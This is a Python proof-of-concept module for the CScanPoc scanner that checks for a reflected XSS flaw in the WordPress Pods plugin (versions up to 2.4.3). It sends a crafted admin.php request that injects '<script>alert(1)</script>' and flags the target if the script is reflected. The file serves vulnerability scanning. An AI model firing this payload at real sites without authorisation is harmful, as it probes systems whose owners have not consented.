# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0141'  # 平台漏洞编号，留空
    name = 'Wordpress Plugin Pods <= 2.4.3 XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-01-16'  # 漏洞公布时间
    desc = '''
    Wordpress:小于2.4版本的Pods插件中<a>标记未闭合，导致HTTP GET参数数据中，可以产生反射型的xss漏洞。
    '''  # 漏洞描述
    ref = 'http://www.securityfocus.com/archive/1/534437'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Wordpress Plugin Pods <= 2.4.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '988b23f9-d9eb-4b22-a203-3ebfb8abf2b8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/wp-admin/admin.php?page=pods&action=edit&id=4"></a><script>alert(1)</script><!--'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '<script>alert(1)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()